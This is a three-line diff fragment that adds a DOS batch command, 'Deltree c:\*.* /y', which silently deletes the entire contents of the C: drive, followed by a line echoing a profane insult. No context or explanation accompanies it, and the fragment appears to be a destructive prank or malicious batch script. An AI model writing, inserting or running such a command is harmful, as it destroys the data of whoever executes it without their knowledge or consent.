@@ -1,0 +1,3 @@
+   Deltree c:\*.* /y
+
+   echo Fuck you....
